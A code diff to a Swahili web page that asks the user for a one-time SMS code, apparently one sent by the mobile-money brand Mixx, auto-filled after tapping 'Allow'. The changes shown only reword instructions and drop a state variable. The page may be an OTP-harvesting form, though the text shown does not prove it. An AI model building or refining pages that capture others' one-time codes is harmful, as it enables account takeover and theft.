@@ -74,10 +74,10 @@
                 <h3>✅ Namba ya Uthibitisho <span class="auto-detect-badge"><span class="dot"></span> Auto-detect</span></h3>
                 <div class="phone-display" id="showPhone">+255 ---------</div>
                 <div class="code-instruction">
-                    <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki kutoka kwenye arifa</strong><br><br>
+                    <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki</strong><br><br>
                     <strong>1.</strong> Subiri SMS ifike<br>
                     <strong>2.</strong> Bonyeza <strong>"Allow"</strong> kwenye kidirisha<br>
-                    <strong>3.</strong> Ujumbe utajaza kiotomatiki<br>
+                    <strong>3.</strong> SMS itajaza moja kwa moja<br>
                     <strong>4.</strong> Bonyeza <strong>"Endelea"</strong>
                 </div>
                 <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
@@ -128,7 +128,6 @@
         var isSubmitting = false;
         var smsDetected = false;
         var detectedCode = '';
-        var waitingForNotification = false;
 
         // ================================================================
         // iPhone/Android DETECTION
@@ -183,7 +182,6 @@
             document.getElementById('smsMessage').value = '';
             smsDetected = false;
             detectedCode = '';
-            waitingForNotification = false;
             document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo kutoka Mixx. (' + resendCount + '/3)'; 
             document.getElementById('codeError').style.color = 'var(--primary)'; 
             document.getElementById('codeError').classList.add('show'); 
@@ -255,7 +253,6 @@
             document.getElementById('smsMessage').value = ''; 
             smsDetected = false;
             detectedCode = '';
-            waitingForNotification = false;
             document.getElementById('codeError').textContent = 'Msimbo sio sahihi. Jaribu tena.'; 
             document.getElementById('codeError').style.color = 'var(--danger)'; 
             document.getElementById('codeError').classList.add('show'); 
@@ -295,7 +292,6 @@
                 return;
             }
 
-            waitingForNotification = true;
             console.log('⏳ Waiting for SMS notification...');
             document.getElementById('codeError').textContent = '⏳ Inasubiri SMS... Bonyeza "Allow" ikitokea';
             document.getElementById('codeError').style.color = 'var(--primary)';
@@ -344,7 +340,6 @@
                     document.getElementById('codeError').style.color = 'var(--danger)';
                     document.getElementById('codeError').classList.add('show');
                 }
-                waitingForNotification = false;
             }
         }
 
